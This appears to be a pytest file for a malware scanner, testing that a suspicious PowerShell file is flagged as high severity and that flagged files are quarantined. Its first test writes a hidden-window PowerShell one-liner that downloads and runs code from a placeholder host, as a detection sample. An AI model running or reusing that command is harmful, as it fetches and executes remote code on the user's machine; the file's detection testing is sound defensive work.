from pathlib import Path
from guardianx.core.scanner import scan_paths
from guardianx.core.signatures import load_signatures
from guardianx.core.quarantine import QuarantineManager

def test_heuristic_detects_suspicious_powershell(tmp_path: Path):
    sample = tmp_path / "dropper.ps1"
    sample.write_text("powershell -nop -w hidden; IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')", encoding="utf-8")
    findings = scan_paths([sample], load_signatures())
    assert findings
    assert findings[0].severity == "high"

def test_quarantine_moves_file(tmp_path: Path):
    sample = tmp_path / "bad.ps1"
    sample.write_text("powershell downloadstring iex", encoding="utf-8")
    finding = scan_paths([sample])[0]
    q = QuarantineManager(tmp_path / "vault")
    dst = q.quarantine(finding)
    assert dst.exists()
    assert not sample.exists()
    assert q.list_items()[0]["original_path"].endswith("bad.ps1")
